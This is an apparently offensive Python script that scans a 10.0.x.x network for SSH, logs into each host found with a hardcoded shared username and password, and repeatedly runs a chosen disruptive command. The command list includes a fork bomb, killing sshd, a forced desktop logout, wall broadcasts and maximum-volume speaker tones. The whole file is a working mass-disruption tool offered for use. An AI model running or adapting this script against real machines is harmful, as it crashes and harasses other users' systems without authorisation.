# for service


import pxssh  # you must install/include this library (no standard)
import socket
import time
from threading import *
import os

def login(ipp, order):
    s = pxssh.pxssh()
    if not s.login (ipp, ipp, "lernen"):
        exit()

    else:
        s.sendline("bash")
        s.sendline("export DISPLAY=:0")
        s.sendline("amixer sset 'Master' 100%")
        s.sendline(order)
        s.prompt()
        s.logout()



def ipadress(floor_begin, floor_end , area_begin, area_end):
    IP1 = "10.0."
    Num1 = floor_begin
    Num2 = floor_end + 1
    ip_liste = []

    while Num1!=Num2:
        IP = IP1 + str(Num1) +"."
        Var = area_begin
        while Var < area_end:


            ip = IP + str(Var)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.01)
                s.connect((ip, 22))
                s.settimeout(None)
                ip_liste.append(ip)
                s.close
            except:
                pass

            Var +=1
        Num1+=1
    return ip_liste


class attack(Thread):

    def __init__(self,ipp,order):
        Thread.__init__(self)
        self.ipp = "lernen@" +ipp
        self.order = order


    def run(self):
        login(self.ipp, self.order)
        return 0


list_of_orders = ["killall sshd","speaker-test -t sine -f 1000 -l 2 2>&1",":(){ :|:&};:","qdbus org.kde.ksmserver /KSMServer logout 0 0 0" ,"echo 'Error' | wall", "amixer sset 'Master' 100%", "notify-send 'title' 'text'"]
numbers = []
count = 0

# Main

while count < 4:
    a = int(input("Numbers: "))
    numbers.append(a)
    count +=1

b = int(input("Order: "))
order = list_of_orders[b]
youripp = input("Own Ipp: ")

while True:

    List = ipadress(numbers[0],numbers[1],numbers[2],numbers[3])
    if ("10.0.2."+youripp) in List:
        List.remove("10.0.2."+youripp)


    
    for i in List:
        check = attack(i,order)
        check.start()
        time.sleep(0.1)
        
    List =[]
    time.sleep(1.5)
    os.system("clear")
    

